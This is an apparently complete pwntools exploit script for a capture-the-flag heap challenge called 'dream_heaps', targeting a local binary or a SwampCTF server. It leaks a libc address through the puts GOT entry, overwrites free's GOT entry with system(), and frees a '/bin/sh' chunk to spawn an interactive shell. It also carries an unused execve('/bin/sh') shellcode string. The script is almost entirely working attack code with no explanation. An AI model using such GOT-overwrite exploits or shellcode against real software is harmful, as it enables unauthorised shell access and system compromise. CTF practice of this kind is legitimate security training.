from pwn import *

# context.log_level = 'DEBUG'
TARGET = './dream_heaps'
HOST = 'chal1.swampctf.com'
PORT = 1070
r = process(TARGET)
# r = remote(HOST, PORT)

SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def write_d(length, content):
	payload = ''
	payload += '1'
	r.sendline(payload)

	r.recvuntil('?')
	payload = ''
	payload += str(length)
	r.sendline(payload)

	r.recvuntil('?')
	payload = ''
	payload += content
	r.sendline(payload) 

	r.recvuntil('>')

def fake_write(length):
	payload = ''
	payload += '1'
	r.sendline(payload)

	r.recvuntil('?')
	payload = ''
	payload += str(length)
	r.sendline(payload)

	r.recvuntil('>')

def read_d(index): 
	payload = ''
	payload += '2'
	r.sendline(payload)

	r.recvuntil('?')
	payload = ''
	payload += str(index)
	r.sendline(payload) 

def edit_d(index, new_content):
	payload = ''
	payload += '3'
	r.sendline(payload)

	r.recvuntil('?')
	payload = ''
	payload += str(index)
	r.sendline(payload)

	payload = ''
	payload += new_content
	r.sendline(payload) 

	r.recvuntil('>')

def delete_d(index):
	payload = ''
	payload += '4'
	r.sendline(payload)

	r.recvuntil('?')
	payload = ''
	payload += str(index)
	r.sendline(payload) 





gdb.attach(r, '''
b*0x400831
c
d
b*0x4008fe
b*0x4009eb
x/10dwx $rax
c
''')
elf = ELF(TARGET)

r.recvuntil('>')

# read_d(-16)
# leak = r.recv(8)
# print "leak:", leak
# print hex(u64(leak))
# r.recvuntil('>')


write_d(8, '/bin/sh')

for i in range(19):
	write_d(5+i, 'AAAA')

write_d(elf.got['puts'], 'AAAA')
fake_write(0)
read_d(18)
r.recvuntil('\n')
leak = u64(r.recv(6).ljust(8, '\x00'))
base = leak - 0x6f690
system = base + 0x45390

dbg("leak")
dbg("base")

r.recvuntil('>')

write_d(elf.got['free'], 'AAAA')
edit_d(19, p64(system)+p64(leak))
delete_d(0)
r.interactive()
r.close()
